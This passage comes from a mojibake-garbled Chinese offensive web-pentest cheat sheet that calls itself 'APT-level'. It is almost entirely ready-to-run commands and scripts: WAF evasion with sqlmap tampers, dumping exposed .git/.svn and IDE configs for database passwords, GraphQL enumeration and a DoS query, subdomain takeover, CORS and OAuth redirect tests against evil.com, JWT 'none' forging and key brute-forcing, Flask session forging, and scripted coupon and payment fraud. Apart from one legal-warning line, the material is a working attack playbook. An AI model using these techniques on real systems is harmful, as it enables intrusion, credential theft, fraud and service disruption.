# ä½¿ç”¨ç‰¹å®šTLSç‰ˆæœ¬
curl -sk --tlsv1.2 https://target.com
curl -sk --tlsv1.3 https://target.com

# ç¦ç”¨æŸäº›TLSç‰¹æ€§
curl -sk --no-alpn --no-npn https://target.com
```

---

## ğŸ› ï¸ è‡ªåŠ¨åŒ–ç»•è¿‡å·¥å…·

### SQLMap WAFç»•è¿‡

```bash
# Cloudflare
sqlmap -u "URL" --random-agent --tamper=space2comment,between

# é€šç”¨WAF
sqlmap -u "URL" \
    --tamper=apostrophemask,apostrophenullencode,base64encode,between,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes \
    --random-agent \
    --delay=2 \
    --timeout=10

# é˜¿é‡Œäº‘ç›¾
sqlmap -u "URL" --tamper=space2comment --hpp
```

### Bypasså·¥å…·é›†

```bash
# wafw00fè¯†åˆ«
wafw00f -a https://target.com

# bypasswafè‡ªåŠ¨ç»•è¿‡
python3 bypasswaf.py -u https://target.com

# CloudFlairçœŸå®IP
python3 cloudflair.py target.com

# CrackMapExec (å†…ç½‘WAFç»•è¿‡)
crackmapexec smb 192.168.1.0/24 -u admin -p password --bypass-waf
```

---

## ğŸ“Š WAFç»•è¿‡æˆåŠŸç‡å‚è€ƒ

| WAFç±»å‹ | ç»•è¿‡éš¾åº¦ | æˆåŠŸç‡ | æ¨èæ–¹æ³• |
|---------|---------|--------|---------|
| **Cloudflare** | â­â­â­â­ | 40% | çœŸå®IPå‘ç° |
| **AWS WAF** | â­â­â­ | 55% | ç¼–ç +å¤´ä¼ªé€  |
| **Akamai** | â­â­â­â­â­ | 25% | åè®®é™çº§ |
| **Imperva** | â­â­â­â­ | 35% | å‚æ•°æ±¡æŸ“ |
| **å®‰å…¨ç‹—** | â­â­ | 75% | å†…è”æ³¨é‡Š |
| **äº‘é”** | â­â­ | 70% | å¤§å°å†™æ··æ·† |
| **é˜¿é‡Œäº‘ç›¾** | â­â­â­ | 60% | HPP+ç¼–ç  |
| **è…¾è®¯äº‘** | â­â­â­ | 50% | åŒé‡ç¼–ç  |

---

## ğŸš€ ç»¼åˆç»•è¿‡æµç¨‹

```bash
# ç¬¬1æ­¥ï¼šè¯†åˆ«é˜²æŠ¤
wafw00f -a https://target.com
curl -sI https://target.com | grep -i "server\|x-\|cf-"

# ç¬¬2æ­¥ï¼šçœŸå®IPå‘ç°ï¼ˆå¦‚æœæ˜¯CDNï¼‰
# å†å²DNS
# å­åŸŸåæ‰«æ
# SSLè¯ä¹¦æŸ¥è¯¢
# å…¨çƒDNSæŸ¥è¯¢

# ç¬¬3æ­¥ï¼šå¦‚æœæ‰¾åˆ°çœŸå®IPï¼Œç›´æ¥è®¿é—®
REAL_IP="1.2.3.4"
curl -sk https://$REAL_IP -H "Host: target.com" --resolve target.com:443:$REAL_IP

# ç¬¬4æ­¥ï¼šå¦‚æœæœªæ‰¾åˆ°IPï¼Œåè®®å±‚ç»•è¿‡
curl -sk --http1.1 https://target.com
curl -sk --http3 https://target.com

# ç¬¬5æ­¥ï¼šè¯·æ±‚å±‚ç»•è¿‡
# User-Agentè½®æ¢
# è¯·æ±‚å¤´ä¼ªé€ 
# ç¼–ç payload

# ç¬¬6æ­¥ï¼šåº”ç”¨å±‚ç»•è¿‡
# SQLæ³¨å…¥ï¼šå¤šç§ç¼–ç +tamper
# XSSï¼šæ ‡ç­¾å˜å½¢+äº‹ä»¶åˆ†ç¦»
# æ–‡ä»¶ä¸Šä¼ ï¼šæ‰©å±•å+MIME

# ç¬¬7æ­¥ï¼šè¡Œä¸ºå±‚ç»•è¿‡
# æ…¢é€Ÿæ‰«æ
# åˆ†ç‰‡è¯·æ±‚
# ä»£ç†è½®æ¢
```

---

## âš ï¸ é‡è¦æç¤º

### WAFç»•è¿‡åŸåˆ™

1. **å…ˆæ‰¾çœŸå®IP** - æœ€æœ‰æ•ˆï¼ˆç»•è¿‡CDNï¼‰
2. **æ…¢é€Ÿæµ‹è¯•** - é¿å…è§¦å‘é™åˆ¶
3. **å¤šç§æ–¹æ³•ç»„åˆ** - å•ä¸€æ–¹æ³•æˆåŠŸç‡ä½
4. **ä¿æŒä½è°ƒ** - å¤§è§„æ¨¡æ‰«æå¿…è¢«ban
5. **ä»£ç†è½®æ¢** - IPæ± è¶Šå¤§è¶Šå¥½

### æ³•å¾‹è­¦å‘Š

**ä»…ç”¨äºæˆæƒæµ‹è¯•ï¼æœªç»æˆæƒçš„æ”»å‡»è¡Œä¸ºè¿æ³•ï¼**


â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
## ğŸ¯ APTçº§Webæ‰“ç‚¹æŠ€æœ¯ï¼ˆv10.9ç»ˆæå¢å¼ºï¼‰
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

### ã€æ¨¡å—1ã€‘JSé€†å‘å®Œæ•´å·¥å…·é“¾

#### 1.1 JSæ–‡ä»¶æ·±åº¦åˆ†æ

```bash
# ä¸‹è½½æ‰€æœ‰JSæ–‡ä»¶
TARGET="target.com"
mkdir -p js_analysis && cd js_analysis

# æ–¹æ³•1ï¼škatanaçˆ¬å–
katana -u "https://$TARGET" -js-crawl -d 5 -silent | grep "\.js$" | sort -u > js_urls.txt

# æ–¹æ³•2ï¼šæ‰‹åŠ¨æå–
curl -sk "https://$TARGET" | grep -oE "src=['\"]([^'\"]+\.js)" | cut -d'"' -f2 | \
    while read js; do echo "https://$TARGET$js"; done >> js_urls.txt

# æ‰¹é‡ä¸‹è½½
cat js_urls.txt | xargs -P 20 -I {} sh -c 'curl -sk {} > $(echo {} | md5sum | cut -d" " -f1).js'
```

#### 1.2 Webpack Bundleè§£åŒ…

```bash
# å®‰è£…å·¥å…·
npm install -g webpack-bundle-analyzer source-map-explorer

# è§£åŒ…åˆ†æ
for bundle in *.js; do
    # æå–SourceMap URL
    map_url=$(grep -oE "//# sourceMappingURL=.*" $bundle | cut -d'=' -f2)
    
    if [ -n "$map_url" ]; then
        echo "[âœ…] å‘ç°SourceMap: $bundle"
        # ä¸‹è½½SourceMap
        curl -sk "https://$TARGET/$map_url" -o "${bundle}.map"
        
        # è§£æåŸå§‹æºç 
        source-map-explorer $bundle --html report_${bundle}.html
    fi
done
```

#### 1.3 SourceMapå®Œæ•´åˆ©ç”¨

```bash
# è‡ªåŠ¨å‘ç°SourceMap
cat js_urls.txt | while read url; do
    # å°è¯•ç›´æ¥è®¿é—®.mapæ–‡ä»¶
    map_url="${url}.map"
    if curl -sk "$map_url" -o /dev/null -w "%{http_code}" | grep -q "200"; then
        echo "[âœ… SourceMapæ³„éœ²] $map_url"
        curl -sk "$map_url" -o "$(basename $url).map"
    fi
done

# æå–åŸå§‹æºç 
python3 << 'PYEOF'
import json
import os

for map_file in os.listdir('.'):
    if not map_file.endswith('.map'):
        continue
    
    with open(map_file) as f:
        source_map = json.load(f)
    
    # æå–æ‰€æœ‰æºæ–‡ä»¶
    if 'sourcesContent' in source_map:
        sources = source_map.get('sources', [])
        contents = source_map['sourcesContent']
        
        for i, (source, content) in enumerate(zip(sources, contents)):
            if content:
                # ä¿å­˜åŸå§‹æ–‡ä»¶
                filename = f"source_{i}_{os.path.basename(source)}"
                with open(filename, 'w') as out:
                    out.write(content)
                print(f"[âœ…] æå–æºç : {filename}")
PYEOF
```

#### 1.4 éšè—APIç«¯ç‚¹æå–

```bash
# ä»JSä¸­æå–APIç«¯ç‚¹
cat *.js | grep -oE "(https?://[^\"']+)?/api/[a-zA-Z0-9/_-]+" | sort -u > api_from_js.txt
cat *.js | grep -oE "/v[0-9]+/[a-zA-Z0-9/_-]+" | sort -u >> api_from_js.txt

# æå–å®Œæ•´URLæ¨¡å¼
cat *.js | grep -oE "https?://[a-zA-Z0-9.-]+/[^\"'\s]+" | sort -u > urls_from_js.txt

# æå–APIå¯†é’¥/Token
cat *.js | grep -iE "(api[_-]?key|token|secret|password|auth)\s*[:=]\s*['\"]([^'\"]{20,})" | \
    grep -v "function\|var\|let\|const" > potential_keys.txt

# æå–å†…ç½‘IP/åŸŸå
cat *.js | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | \
    grep -vE "^0\.|^127\.|^255\." | sort -u > ips_from_js.txt
cat *.js | grep -oE "[a-zA-Z0-9-]+\.internal|[a-zA-Z0-9-]+\.local" >> internal_domains.txt
```

#### 1.5 JSæ··æ·†ä»£ç åæ··æ·†

```bash
# å®‰è£…åæ··æ·†å·¥å…·
npm install -g javascript-obfuscator js-beautify

# ç¾åŒ–æ··æ·†ä»£ç 
for js in *.js; do
    js-beautify $js > "${js}.beautified.js"
done

# ä½¿ç”¨åœ¨çº¿å·¥å…·ï¼ˆæ¨èï¼‰
# https://obf-io.deobfuscate.io/
# https://lelinhtinh.github.io/de4js/

# æ‰‹åŠ¨åˆ†æå…³é”®å‡½æ•°
grep -n "XMLHttpRequest\|fetch\|axios" *.beautified.js
```

---

### ã€æ¨¡å—2ã€‘æºç æ³„éœ²æ·±åº¦è‡ªåŠ¨åŒ–

#### 2.1 .gitå®Œæ•´æ¢å¤

```bash
# å·¥å…·1ï¼šGitHackï¼ˆæ¨èï¼‰
git clone https://github.com/lijiejie/GitHack
cd GitHack
python3 GitHack.py http://target.com/.git/

# å·¥å…·2ï¼šgit-dumper
pip3 install git-dumper
git-dumper http://target.com/.git/ output_dir

# æ‰‹åŠ¨æ¢å¤
mkdir git_leak && cd git_leak
wget -r -np -nH --cut-dirs=1 http://target.com/.git/

# æ¢å¤æ‰€æœ‰å†å²æäº¤
git checkout .
git log --all --oneline
git show <commit-id>

# æœç´¢æ•æ„Ÿä¿¡æ¯
git log -p | grep -i "password\|key\|secret\|token" -B 5 -A 5 > sensitive.txt
```

#### 2.2 .svn/.hg/.bzræ³„éœ²

```bash
# SVNæ³„éœ²
svn checkout http://target.com/.svn/ svn_leak

# æ‰‹åŠ¨æ¢å¤SVN
wget -r -np http://target.com/.svn/
sqlite3 .svn/wc.db "SELECT local_relpath, checksum FROM nodes;" | \
    while IFS='|' read file hash; do
        wget "http://target.com/.svn/pristine/${hash:0:2}/${hash}.svn-base" -O "$file"
    done

# Mercurial (.hg)
hg clone http://target.com/.hg/ hg_leak

# Bazaar (.bzr)
bzr branch http://target.com/.bzr/ bzr_leak
```

#### 2.3 .DS_Storeæ·±åº¦åˆ©ç”¨

```bash
# å·¥å…·ï¼šds_store_exp
pip3 install ds-store
git clone https://github.com/lijiejie/ds_store_exp

python3 ds_store_exp.py http://target.com/.DS_Store

# æ‰‹åŠ¨è§£æ
wget http://target.com/.DS_Store
python3 << 'PYEOF'
from ds_store import DSStore

with DSStore.open('.DS_Store', 'r') as d:
    for entry in d:
        print(f"[+] {entry.filename}")
PYEOF
```

#### 2.4 ç¼–è¾‘å™¨ä¸´æ—¶æ–‡ä»¶

```bash
# Vimä¸´æ—¶æ–‡ä»¶
for file in index.php admin.php config.php database.php; do
    curl -sk "http://target.com/${file}.swp" -o "${file}.swp"
    curl -sk "http://target.com/${file}.swo" -o "${file}.swo"
    curl -sk "http://target.com/.${file}.swp" -o ".${file}.swp"
    
    # æ¢å¤vimäº¤æ¢æ–‡ä»¶
    vim -r "${file}.swp" 2>/dev/null && echo "[âœ…] æ¢å¤æˆåŠŸ: $file"
done

# Emacså¤‡ä»½
for file in index.php config.php; do
    curl -sk "http://target.com/${file}~" -o "${file}~"
    curl -sk "http://target.com/#${file}#" -o "#${file}#"
done

# Sublime/VSCode
curl -sk "http://target.com/.vscode/sftp.json"  # SFTPé…ç½®
curl -sk "http://target.com/.idea/dataSources.xml"  # æ•°æ®åº“é…ç½®
```

#### 2.5 IDEé…ç½®æ³„éœ²

```bash
# IntelliJ IDEA
curl -sk "http://target.com/.idea/workspace.xml"
curl -sk "http://target.com/.idea/dataSources.xml"
curl -sk "http://target.com/.idea/dataSources.local.xml"
curl -sk "http://target.com/.idea/webServers.xml"

# VSCode
curl -sk "http://target.com/.vscode/settings.json"
curl -sk "http://target.com/.vscode/sftp.json"
curl -sk "http://target.com/.vscode/launch.json"

# Eclipse
curl -sk "http://target.com/.project"
curl -sk "http://target.com/.classpath"

# æå–æ•°æ®åº“å¯†ç 
cat dataSources.xml | grep -oE "password.*" | cut -d'>' -f2 | cut -d'<' -f1
```

---

### ã€æ¨¡å—3ã€‘APIæ–‡æ¡£å®Œæ•´æ”»å‡»çŸ©é˜µ

#### 3.1 Swagger/OpenAPIè‡ªåŠ¨æšä¸¾

```bash
# å¸¸è§Swaggerè·¯å¾„
SWAGGER_PATHS=(
    "/swagger.json"
    "/swagger-ui.html"
    "/swagger/v1/swagger.json"
    "/swagger/v2/swagger.json"
    "/api-docs"
    "/api/swagger.json"
    "/api/v1/swagger.json"
    "/api/v2/swagger.json"
    "/api/v3/swagger.json"
    "/openapi.json"
    "/v2/api-docs"
    "/v3/api-docs"
    "/doc.html"
    "/docs"
    "/swagger-resources"
)

for path in "${SWAGGER_PATHS[@]}"; do
    response=$(curl -sk "https://$TARGET$path" -w "%{http_code}")
    if echo "$response" | grep -q "swagger\|openapi"; then
        echo "[âœ… Swaggerå‘ç°] $path"
        curl -sk "https://$TARGET$path" > "swagger_$(echo $path | tr '/' '_').json"
    fi
done

# è§£æSwaggerï¼Œæå–æ‰€æœ‰API
python3 << 'PYEOF'
import json
import sys

with open('swagger.json') as f:
    swagger = json.load(f)

base_url = swagger.get('basePath', '')
paths = swagger.get('paths', {})

for path, methods in paths.items():
    for method, details in methods.items():
        print(f"{method.upper()} {base_url}{path}")
        
        # æå–å‚æ•°
        params = details.get('parameters', [])
        for param in params:
            print(f"  - {param.get('name')} ({param.get('in')}): {param.get('type')}")
PYEOF
```

#### 3.2 GraphQLå®Œæ•´æ”»å‡»é“¾

```bash
# GraphQLç«¯ç‚¹å‘ç°
GRAPHQL_PATHS=(
    "/graphql"
    "/api/graphql"
    "/graphql/console"
    "/graphql/graphiql"
    "/graphiql"
    "/graphql.php"
    "/v1/graphql"
    "/v2/graphql"
    "/query"
)

for path in "${GRAPHQL_PATHS[@]}"; do
    curl -sk "https://$TARGET$path" -X POST \
        -H "Content-Type: application/json" \
        -d '{"query":"{__typename}"}' | grep -q "__typename" && \
        echo "[âœ… GraphQLå‘ç°] $path"
done

# å†…çœæŸ¥è¯¢ï¼ˆè·å–å®Œæ•´Schemaï¼‰
curl -sk "https://$TARGET/graphql" -X POST \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { types { name kind description fields { name type { name kind ofType { name kind } } } } } }"}' \
    > graphql_schema.json

# æå–æ‰€æœ‰æŸ¥è¯¢/å˜æ›´
python3 << 'PYEOF'
import json

with open('graphql_schema.json') as f:
    schema = json.load(f)

types = schema['data']['__schema']['types']

for type_def in types:
    if type_def['name'] in ['Query', 'Mutation']:
        print(f"\n[{type_def['name']}]")
        for field in type_def.get('fields', []):
            print(f"  {field['name']}")
PYEOF

# GraphQLæ‰¹é‡æŸ¥è¯¢ï¼ˆåˆ«åæ”»å‡»ï¼‰
curl -sk "https://$TARGET/graphql" -X POST \
    -H "Content-Type: application/json" \
    -d '{
  "query": "{ 
    user1: user(id: 1) { id name email } 
    user2: user(id: 2) { id name email } 
    user3: user(id: 3) { id name email }
  }"
}'

# GraphQLæ·±åº¦æŸ¥è¯¢ï¼ˆDoSï¼‰
curl -sk "https://$TARGET/graphql" -X POST \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user { posts { comments { author { posts { comments { author { name } } } } } } } }"}'
```

#### 3.3 gRPCåå°„å®Œæ•´åˆ©ç”¨

```bash
# å®‰è£…grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# æ£€æµ‹gRPCæœåŠ¡
grpcurl -plaintext $TARGET:50051 list

# åˆ—å‡ºæ‰€æœ‰æœåŠ¡
grpcurl -plaintext $TARGET:50051 list

# åˆ—å‡ºæœåŠ¡çš„æ–¹æ³•
grpcurl -plaintext $TARGET:50051 list package.ServiceName

# æŸ¥çœ‹æ–¹æ³•è¯¦æƒ…
grpcurl -plaintext $TARGET:50051 describe package.ServiceName.MethodName

# è°ƒç”¨æ–¹æ³•
grpcurl -plaintext -d '{"user_id": 1}' $TARGET:50051 package.ServiceName/GetUser

# æ‰¹é‡æšä¸¾
for i in {1..1000}; do
    grpcurl -plaintext -d "{\"user_id\": $i}" $TARGET:50051 api.UserService/GetUser
done
```

#### 3.4 APIç‰ˆæœ¬å·çˆ†ç ´

```bash
# APIç‰ˆæœ¬æ¨¡å¼
API_VERSIONS=(
    "/api/v1"
    "/api/v2"
    "/api/v3"
    "/v1/api"
    "/v2/api"
    "/api/1.0"
    "/api/2.0"
    "/api/internal"
    "/api/admin"
    "/api/test"
    "/api/dev"
)

BASE_API="/api/users"

for version in "${API_VERSIONS[@]}"; do
    response=$(curl -sk "https://$TARGET${version}${BASE_API}" -w "%{http_code}")
    if echo "$response" | grep -qE "^\[|\{"; then
        echo "[âœ… APIç‰ˆæœ¬å‘ç°] ${version}${BASE_API}"
    fi
done

# æ—§ç‰ˆAPIå¯èƒ½æ— è®¤è¯
curl -sk "https://$TARGET/api/v1/users"  # æ—§ç‰ˆï¼Œå¯èƒ½æœªæˆæƒ
curl -sk "https://$TARGET/api/v3/users"  # æ–°ç‰ˆï¼Œéœ€è¦è®¤è¯
```

---

### ã€æ¨¡å—4ã€‘å­åŸŸåæ¥ç®¡æ£€æµ‹ä¸åˆ©ç”¨

#### 4.1 å­åŸŸåæ¥ç®¡æ£€æµ‹

```bash
# å·¥å…·ï¼šsubjack
go install github.com/haccer/subjack@latest
subjack -w subdomains.txt -t 100 -timeout 30 -o takeover.txt -ssl

# æ‰‹åŠ¨æ£€æµ‹
cat subdomains.txt | while read domain; do
    # è·å–CNAME
    cname=$(dig +short $domain | grep -E "[a-z]" | head -1)
    
    if [ -n "$cname" ]; then
        # æ£€æŸ¥æ˜¯å¦å¯æ¥ç®¡
        if curl -sk "https://$domain" | grep -qiE "NoSuchBucket|Repository not found|Project not found|Not Found"; then
            echo "[âœ… å¯èƒ½å¯æ¥ç®¡] $domain â†’ $cname"
        fi
    fi
done
```

#### 4.2 äº‘æœåŠ¡æ¥ç®¡

```bash
# AWS S3æ¥ç®¡
# CNAMEæŒ‡å‘: xxx.s3.amazonaws.com
aws s3 mb s3://xxx  # åˆ›å»ºåŒåæ¡¶

# Azureæ¥ç®¡
# CNAMEæŒ‡å‘: xxx.azurewebsites.net
# åˆ›å»ºåŒåApp Service

# GitHub Pagesæ¥ç®¡
# CNAMEæŒ‡å‘: xxx.github.io
# åˆ›å»ºåŒårepoï¼Œå¼€å¯Pages

# Herokuæ¥ç®¡
# CNAMEæŒ‡å‘: xxx.herokuapp.com
heroku apps:create xxx

# æ£€æµ‹è„šæœ¬
python3 << 'PYEOF'
import dns.resolver
import requests

FINGERPRINTS = {
    's3.amazonaws.com': 'NoSuchBucket',
    'azurewebsites.net': 'Error 404',
    'github.io': 'There isn\'t a GitHub Pages site here',
    'herokuapp.com': 'No such app',
    'netlify.app': 'Not Found',
    'vercel.app': '404',
}

def check_takeover(domain):
    try:
        cname = dns.resolver.resolve(domain, 'CNAME')[0].to_text()
        
        for service, fingerprint in FINGERPRINTS.items():
            if service in cname:
                resp = requests.get(f'https://{domain}', timeout=5)
                if fingerprint in resp.text:
                    print(f'[âœ… å¯æ¥ç®¡] {domain} â†’ {cname}')
    except:
        pass

# æ‰¹é‡æ£€æµ‹
with open('subdomains.txt') as f:
    for domain in f:
        check_takeover(domain.strip())
PYEOF
```

---

### ã€æ¨¡å—5ã€‘é…ç½®é”™è¯¯å®Œæ•´æ£€æµ‹

#### 5.1 CORSæ·±åº¦åˆ©ç”¨

```bash
# CORSé”™è¯¯é…ç½®æ£€æµ‹
check_cors() {
    local url=$1
    
    # æµ‹è¯•1ï¼šä»»æ„Origin
    resp=$(curl -sk "$url" -H "Origin: https://evil.com" -I)
    if echo "$resp" | grep -q "Access-Control-Allow-Origin: https://evil.com"; then
        echo "[âœ… CORSæ¼æ´] å…è®¸ä»»æ„Origin: $url"
    fi
    
    # æµ‹è¯•2ï¼šnull Origin
    resp=$(curl -sk "$url" -H "Origin: null" -I)
    if echo "$resp" | grep -q "Access-Control-Allow-Origin: null"; then
        echo "[âœ… CORSæ¼æ´] å…è®¸null Origin: $url"
    fi
    
    # æµ‹è¯•3ï¼šCredentials
    resp=$(curl -sk "$url" -H "Origin: https://evil.com" -I)
    if echo "$resp" | grep -q "Access-Control-Allow-Credentials: true"; then
        echo "[âœ… CORSæ¼æ´] å…è®¸Credentials: $url"
    fi
}

# æ‰¹é‡æ£€æµ‹
cat urls.txt | while read url; do
    check_cors "$url"
done
```

#### 5.2 CSPç»•è¿‡

```bash
# CSPç­–ç•¥æå–
curl -sI "https://$TARGET" | grep -i "Content-Security-Policy"

# CSPç»•è¿‡æ£€æµ‹
python3 << 'PYEOF'
import requests

url = "https://target.com"
resp = requests.get(url)
csp = resp.headers.get('Content-Security-Policy', '')

# æ£€æŸ¥unsafe-inline
if 'unsafe-inline' in csp:
    print('[âš ï¸] CSPå…è®¸unsafe-inline')

# æ£€æŸ¥é€šé…ç¬¦
if '*' in csp:
    print('[âš ï¸] CSPåŒ…å«é€šé…ç¬¦')

# æ£€æŸ¥jsonpç«¯ç‚¹
if 'script-src' in csp:
    domains = [d.strip() for d in csp.split('script-src')[1].split(';')[0].split()]
    for domain in domains:
        if 'googleapis.com' in domain or 'jquery.com' in domain:
            print(f'[âœ…] å¯èƒ½å­˜åœ¨JSONPç»•è¿‡: {domain}')
PYEOF
```

#### 5.3 åå‘ä»£ç†é…ç½®é”™è¯¯

```bash
# Nginxé…ç½®é”™è¯¯æ£€æµ‹
curl -sk "https://$TARGET/..;/admin"  # è·¯å¾„è§„èŒƒåŒ–
curl -sk "https://$TARGET/%2e%2e/admin"  # URLç¼–ç 

# Apacheé…ç½®é”™è¯¯
curl -sk "https://$TARGET/.%252e/.%252e/admin"  # åŒé‡ç¼–ç 

# IISé…ç½®é”™è¯¯
curl -sk "https://$TARGET/admin::\$INDEX_ALLOCATION"  # NTFSæµ

# é€šç”¨ç»•è¿‡
curl -sk "https://$TARGET/admin" -H "X-Original-URL: /admin"
curl -sk "https://$TARGET/admin" -H "X-Rewrite-URL: /admin"
curl -sk "https://$TARGET" -H "X-Forwarded-Host: evil.com"
```

---

### ã€æ¨¡å—6ã€‘è®¤è¯æˆæƒæ·±åº¦ç»•è¿‡

#### 6.1 JWTæ·±åº¦ä¼ªé€ 

```bash
# JWTç»“æ„åˆ†æ
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx" | \
    cut -d'.' -f1 | base64 -d | jq .

# Noneç®—æ³•æ”»å‡»
python3 << 'PYEOF'
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}

token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') + '.' + \
        base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') + '.'

print(token)
PYEOF

# å¼±å¯†é’¥çˆ†ç ´
pip3 install pyjwt
python3 << 'PYEOF'
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

WEAK_KEYS = ['secret', 'password', '123456', 'admin', 'test']

for key in WEAK_KEYS:
    try:
        decoded = jwt.decode(token, key, algorithms=["HS256"])
        print(f'[âœ…] æ‰¾åˆ°å¯†é’¥: {key}')
        print(decoded)
        break
    except:
        pass
PYEOF

# å¯†é’¥æ··æ·†æ”»å‡»ï¼ˆRS256â†’HS256ï¼‰
# ä½¿ç”¨å…¬é’¥ä½œä¸ºHMACå¯†é’¥
openssl rsa -pubin -in public.pem -text -noout
```

#### 6.2 OAuth 2.0å®Œæ•´æ”»å‡»é“¾

```bash
# OAuthæˆæƒç åŠ«æŒ
# 1. CSRFæ”»å‡»
# æ²¡æœ‰stateå‚æ•° â†’ ä¼ªé€ æˆæƒè¯·æ±‚

# 2. é‡å®šå‘URLåŠ«æŒ
https://target.com/oauth/callback?code=xxx&redirect_uri=https://evil.com

# 3. æˆæƒç é‡æ”¾
curl -X POST https://target.com/oauth/token \
    -d "code=STOLEN_CODE&client_id=xxx&client_secret=xxx&grant_type=authorization_code"

# 4. éšå¼æˆæƒæµç¨‹åŠ«æŒ
# access_tokenç›´æ¥åœ¨URL Fragmentä¸­

# 5. Client Credentialsæ³„éœ²
grep -r "client_secret" js_files/
```

#### 6.3 Session/Cookieä¼ªé€ 

```bash
# Flask Sessionä¼ªé€ 
pip3 install flask-unsign

# è§£ç Session
flask-unsign --decode --cookie "eyJ1c2VyX2lkIjoxfQ..."

# çˆ†ç ´å¯†é’¥
flask-unsign --wordlist wordlist.txt --unsign --cookie "..."

# ä¼ªé€ Session
flask-unsign --sign --cookie "{'user_id': 1, 'is_admin': True}" --secret "å¯†é’¥"

# Django Sessionä¼ªé€ 
# Sessionå­˜å‚¨åœ¨æ•°æ®åº“/ç¼“å­˜ä¸­ï¼Œéœ€è¦SECRET_KEY

# PHP Sessionä¼ªé€ 
# session.serialize_handler=php_serialize
# ååºåˆ—åŒ–æ”»å‡»
```

---


### ã€æ¨¡å—7ã€‘ä¸šåŠ¡é€»è¾‘å®Œæ•´åˆ†æ

#### 7.1 æ”¯ä»˜æµç¨‹æ¼æ´

```bash
# é‡‘é¢ç¯¡æ”¹
# æŠ“åŒ…ä¿®æ”¹amountå‚æ•°
POST /api/order/create
{"amount": 0.01, "product_id": 123}  # åŸä»·999.99

# è®¢å•é‡æ”¾
# æ”¯ä»˜æˆåŠŸåé‡æ”¾è¯·æ±‚ï¼Œè·å–å¤šæ¬¡å•†å“

# å¹¶å‘ç«æ€
# åŒæ—¶å‘èµ·å¤šä¸ªæ”¯ä»˜è¯·æ±‚ï¼Œåªæ‰£ä¸€æ¬¡é’±

# è´§å¸å•ä½æ··æ·†
{"amount": 100, "currency": "USD"}  # æœåŠ¡ç«¯å½“æˆCNYå¤„ç†

# æ”¯ä»˜å›è°ƒä¼ªé€ 
POST /api/payment/callback
{"order_id": "xxx", "status": "success", "sign": "ä¼ªé€ ç­¾å"}
```

#### 7.2 ä¼˜æƒ åˆ¸/ç§¯åˆ†é€»è¾‘

```bash
# ä¼˜æƒ åˆ¸é‡å¤ä½¿ç”¨
# æŠ“åŒ…è¯·æ±‚ï¼Œå¤šæ¬¡ä½¿ç”¨åŒä¸€ä¼˜æƒ åˆ¸

# è´Ÿæ•°é‡‘é¢
{"coupon_discount": -100}  # æœåŠ¡ç«¯æ²¡æ ¡éªŒè´Ÿæ•°

# æ•´æ•°æº¢å‡º
{"points": 2147483647}  # æ¥è¿‘intæœ€å¤§å€¼

# æ—¶åºé—®é¢˜
# å…ˆä¸‹å•ï¼Œå†é¢†ä¼˜æƒ åˆ¸ï¼Œä¼˜æƒ åˆ¸å¯è¿½æº¯ä½¿ç”¨

# æ‰¹é‡è–…ç¾Šæ¯›è„šæœ¬
for i in {1..10000}; do
    curl -X POST https://target.com/api/coupon/claim \
        -H "Cookie: session=xxx" \
        -d "coupon_id=FREE100"
done
```

#### 7.3 æ³¨å†Œ/ç™»å½•æµç¨‹ç»•è¿‡

```bash
# éªŒè¯ç ç»•è¿‡
# 1. éªŒè¯ç ä¸åˆ·æ–°
# 2. éªŒè¯ç å¯é‡ç”¨
# 3. éªŒè¯ç åœ¨å“åº”ä¸­è¿”å›
# 4. éªŒè¯ç ä¸ºå›ºå®šå€¼ï¼ˆå¦‚ï¼š1234ï¼‰

# çŸ­ä¿¡éªŒè¯ç ç»•è¿‡
# 1. ä¿®æ”¹æ‰‹æœºå·ä¸ºè‡ªå·±çš„
POST /api/sms/send
{"phone": "è‡ªå·±çš„å·ç ", "verify_phone": "ç›®æ ‡å·ç "}

# 2. éªŒè¯ç æ¥å£æœªé‰´æƒ
GET /api/sms/code?phone=ç›®æ ‡å·ç 

# é‚®ç®±éªŒè¯ç»•è¿‡
# 1. ä¿®æ”¹éªŒè¯é“¾æ¥ä¸­çš„emailå‚æ•°
# 2. ä¿®æ”¹tokenä¸­çš„é‚®ç®±å­—æ®µ

# å¯†ç é‡ç½®æ¼æ´
# 1. é‡ç½®é“¾æ¥tokenå¯é¢„æµ‹
# 2. é‡ç½®æ—¶å¯ä¿®æ”¹user_id
# 3. éªŒè¯ç 4ä½æ•°çˆ†ç ´
```

#### 7.4 æƒé™æ ¡éªŒæ—¶åºé—®é¢˜

```bash
# æ¡ä»¶ç«äº‰
# çº¿ç¨‹1ï¼šå‡çº§VIP
# çº¿ç¨‹2ï¼šä½¿ç”¨VIPåŠŸèƒ½
# å¦‚æœçº¿ç¨‹2åœ¨æƒé™æ£€æŸ¥å’Œå®é™…ä½¿ç”¨ä¹‹é—´æ‰§è¡Œï¼Œå¯èƒ½ç»•è¿‡

# TOCTOUï¼ˆTime-of-Check Time-of-Useï¼‰
# 1. æ£€æŸ¥æƒé™ï¼ˆæ­¤æ—¶æœ‰æƒé™ï¼‰
# 2. æ‰§è¡Œæ“ä½œå‰ï¼Œæƒé™è¢«æ’¤é”€
# 3. ä½†æ“ä½œä»ç„¶æ‰§è¡Œ
```

---

### ã€æ¨¡å—8ã€‘ä¾›åº”é“¾æ·±åº¦æ”»å‡»

